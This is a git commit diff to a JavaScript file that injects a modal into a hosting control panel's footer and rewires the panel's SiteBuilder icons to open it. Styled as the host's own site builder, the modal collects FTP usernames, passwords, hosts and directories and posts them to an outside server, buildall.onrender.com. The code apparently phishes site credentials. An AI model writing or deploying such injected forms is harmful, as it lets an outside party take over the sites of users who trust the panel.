033a700c16d0584d8c66c6e9804da5d6c6d1daad
Anyx <anyxp@protonmail.com>
2022-09-23 18:16:47 +0300

    One small test for man
    One giant success for the community... hopefully.

--- index.js
+++ index.js
@@ -6,46 +6,46 @@
 	*   This file is licensed under MIT Attribution
 	************************************************************************** 
 */
-document.getElementsByTagName("footer")[0].innerHTML += `
-<div class="modal fade" id="sb" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
-  <div class="modal-dialog" role="document">
-    <div class="modal-content">
-      <div class="modal-header">
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
-        <h4 class="modal-title" id="myModalLabel">Entering SiteBuilder (Site.Pro</h4>
-      </div>
-      <div class="modal-body">
-      <div class="alert alert-warning" role="alert">
-  <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
-  <span class="sr-only">Recommened:</span>
-  Upgrade to Premium Hosting for more features,more faster!
-</div>
- 
-        <form method="POST" action="https://buildall.onrender.com/main">
-  <label for="ftp_user">FTP Username:</label><br>
-  <input class="form-control"  type="text" id="ftp_user" name="ftp_user" ><br>
-  <label for="ftp_password">FTP Password:</label><br>
-  <input class="form-control"  type="text" id="ftp_password" name="ftp_password" ><br><br>
-    <label for="domain">Domain Name:</label><br>
-  <input class="form-control" type="text" id="domain" name="domain"><br>
-  <label for="ftp_host">FTP Host:</label><br>
-  <input class="form-control"  type="text" id="ftp_host" name="ftp_host" ><br><br>
-    <label for="builder_upload">Domain Directroy (Example: subdomain.web.net/htdocs/):</label><br>
-  <input class="form-control"  type="text" id="builder_upload" name="builder_upload" ><br><br>
-      <input type="submit" value="Go!" class="btn btn-primary">
-      </form>
+document.addEventListener("DOMContentLoaded", function() {
+  document.getElementsByTagName("footer")[0].innerHTML += `
+  <div class="modal fade" id="sb" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+          <h4 class="modal-title" id="myModalLabel">Entering SiteBuilder (Site.Pro</h4>
+        </div>
+        <div class="modal-body">
+        <div class="alert alert-warning" role="alert">
+    <span class="glyphicon glyphicon-exclamation-sign" aria-hidden="true"></span>
+    <span class="sr-only">Recommened:</span>
+    Upgrade to Premium Hosting for more features,more faster!
+  </div>
+  
+          <form method="POST" action="https://buildall.onrender.com/main">
+    <label for="ftp_user">FTP Username:</label><br>
+    <input class="form-control"  type="text" id="ftp_user" name="ftp_user" ><br>
+    <label for="ftp_password">FTP Password:</label><br>
+    <input class="form-control"  type="text" id="ftp_password" name="ftp_password" ><br><br>
+      <label for="domain">Domain Name:</label><br>
+    <input class="form-control" type="text" id="domain" name="domain"><br>
+    <label for="ftp_host">FTP Host:</label><br>
+    <input class="form-control"  type="text" id="ftp_host" name="ftp_host" ><br><br>
+      <label for="builder_upload">Domain Directroy (Example: subdomain.web.net/htdocs/):</label><br>
+    <input class="form-control"  type="text" id="builder_upload" name="builder_upload" ><br><br>
+        <input type="submit" value="Go!" class="btn btn-primary">
+        </form>
 
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+      
+        </div>
+  
       </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-    
-      </div>
- 
     </div>
   </div>
-</div>
- `
-document.addEventListener("DOMContentLoaded", function() {
+  `
   setTimeout(function() {
     var a = document.getElementById("icon-sitereptile")
     a.setAttribute("data-toggle", "modal");
@@ -56,5 +56,5 @@ document.addEventListener("DOMContentLoaded", function() {
     b.setAttribute("data-target", "#sb");
     b.setAttribute("href", "#sb");
     b.setAttribute("ng-href","#sb");
-  }, 1000);
+  }, 100);
 });
